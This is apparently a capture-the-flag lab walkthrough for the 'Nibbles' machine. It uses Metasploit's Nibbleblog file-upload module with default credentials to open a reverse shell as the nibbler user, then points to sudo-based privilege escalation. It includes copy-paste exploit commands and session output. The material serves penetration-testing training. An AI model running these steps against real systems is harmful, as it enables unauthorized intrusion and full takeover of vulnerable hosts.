# Nibbles — Alternate User Method (Metasploit)

**Goal:** Use Metasploit to exploit the Nibbleblog file upload vulnerability and gain a reverse shell as `nibbler`.

---

## Quick summary
- Start `msfconsole` on your attack box.
- Search for the nibbleblog module: `exploit/multi/http/nibbleblog_file_upload`.
- Load the module and set target options (`RHOSTS`, `LHOST`, `TARGETURI`, `USERNAME`, `PASSWORD`).
- Choose a payload (e.g. `generic/shell_reverse_tcp`).
- Run `exploit` to upload and trigger the file; Metasploit will open a shell session.
- The resulting shell runs as `nibbler` (uid=1001). From here, follow the same privilege escalation steps (monitor.sh + sudo NOPASSWD) as in the manual method to become root.

---

## Commands (copy/paste)

```bash
# start msfconsole
msfconsole

# search for modules
search nibbleblog

# load the module (example using index 0)
use exploit/multi/http/nibbleblog_file_upload

# set target and callback options
set RHOSTS 10.129.42.190
set LHOST 10.10.14.2
set TARGETURI nibbleblog
set USERNAME admin
set PASSWORD nibbles

# choose payload (example)
set PAYLOAD generic/shell_reverse_tcp
set LPORT 4444   # optional if different port

# show options to verify
show options

# run the exploit
exploit
```

Example Metasploit output snippet after exploitation:
```
[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642)
[+] Deleted image.php
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

---

## Notes & tips
- The module defaults to `php/meterpreter/reverse_tcp` if no payload is set; switch to `generic/shell_reverse_tcp` or another payload as desired.
- Metasploit automates the upload and trigger steps, making exploitation faster and more reliable.
- After gaining `nibbler` access, reuse local privilege escalation methods (e.g., LinEnum, inspect `personal.zip`, exploit writable `monitor.sh` via `sudo` NOPASSWD).
- Always test and practice in authorized lab environments only.
